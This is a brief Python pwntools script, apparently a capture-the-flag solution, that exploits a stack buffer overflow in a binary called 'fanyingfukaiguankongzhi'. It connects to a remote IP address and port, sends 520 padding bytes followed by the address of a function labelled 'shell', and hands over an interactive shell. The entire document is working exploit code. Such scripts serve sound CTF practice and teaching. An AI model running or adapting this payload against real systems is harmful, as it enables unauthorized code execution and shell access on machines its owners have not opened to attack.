from pwn import *
# from LibcSearcher import *
context(log_level='debug',terminal=["tmux","splitw","-h"])
binary = "./fanyingfukaiguankongzhi"
# libc_binary = "./"

# p = process(argv=[binary])
p = remote("220.249.52.133",33542)

elf = ELF(binary)
# libc = ELF(libc_binary)


shell = 0x4005f6

context.arch = "amd64"
payload = flat([
    "a"*520,shell	
])
p.sendline(payload)

p.interactive()
